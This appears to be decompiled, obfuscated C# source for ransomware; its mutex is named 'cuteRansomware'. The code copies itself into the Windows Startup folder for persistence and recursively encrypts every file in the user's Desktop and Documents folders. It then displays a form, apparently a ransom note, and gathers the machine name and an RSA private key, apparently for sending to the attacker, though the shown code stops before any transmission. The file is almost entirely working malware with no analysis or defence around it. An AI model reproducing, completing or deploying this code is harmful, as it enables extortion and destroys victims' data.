using System;
using System.Collections.Specialized;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;

internal static class _Trinity_Obfuscator_ObfG_Trinity_Obfuscator_
{
	public enum _Trinity_Obfuscator_qNOH_Trinity_Obfuscator_
	{
		SW_HIDE = 0,
		SW_SHOWNORMAL = 1,
		SW_NORMAL = 1,
		SW_SHOWMINIMIZED = 2,
		SW_SHOWMAXIMIZED = 3,
		SW_MAXIMIZE = 3,
		SW_SHOWNOACTIVATE = 4,
		SW_SHOW = 5,
		SW_MINIMIZE = 6,
		SW_SHOWMINNOACTIVE = 7,
		SW_SHOWNA = 8,
		SW_RESTORE = 9,
		SW_SHOWDEFAULT = 10,
		SW_FORCEMINIMIZE = 11,
		SW_MAX = 11
	}

	[DllImport("shell32.dll")]
	private static extern IntPtr ShellExecute(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, _Trinity_Obfuscator_qNOH_Trinity_Obfuscator_ _Trinity_Obfuscator_qNOH_Trinity_Obfuscator__0);

	private static void _Trinity_Obfuscator_qmEn_Trinity_Obfuscator_(string string_0, byte[] byte_0)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			foreach (FileInfo fileInfo in files)
			{
				_Trinity_Obfuscator_znhb_Trinity_Obfuscator_._Trinity_Obfuscator_DPcC_Trinity_Obfuscator_(fileInfo.FullName, byte_0);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				_Trinity_Obfuscator_qmEn_Trinity_Obfuscator_(directoryInfo2.FullName, byte_0);
			}
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void _Trinity_Obfuscator_JOeF_Trinity_Obfuscator_(string[] args)
	{
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		if (Environment.MachineName == "DESKTOP-B6CEIU5")
		{
			Environment.Exit(0);
			return;
		}
		string location = Assembly.GetExecutingAssembly().Location;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		FileInfo fileInfo = new FileInfo(location);
		try
		{
			if (fileInfo.DirectoryName != folderPath)
			{
				File.Copy(location, folderPath + "\\" + fileInfo.Name);
			}
		}
		catch
		{
		}
		bool createdNew;
		Mutex mutex = new Mutex(initiallyOwned: false, "cuteRansomware", out createdNew);
		mutex.WaitOne();
		GC.Collect();
		if (createdNew)
		{
			mutex.ReleaseMutex();
			Thread.CurrentThread.Priority = ThreadPriority.Highest;
			byte[] byte_ = _Trinity_Obfuscator_HhUw_Trinity_Obfuscator_._Trinity_Obfuscator_ZDyu_Trinity_Obfuscator_();
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			for (int i = 0; i < 5; i++)
			{
				_Trinity_Obfuscator_qmEn_Trinity_Obfuscator_(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), byte_);
				_Trinity_Obfuscator_qmEn_Trinity_Obfuscator_(Environment.GetFolderPath(Environment.SpecialFolder.Personal), byte_);
			}
			((Form)new _Trinity_Obfuscator_VYyb_Trinity_Obfuscator_()).ShowDialog();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["pc"] = Environment.MachineName;
			nameValueCollection["rsa"] = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
		}
	}
}
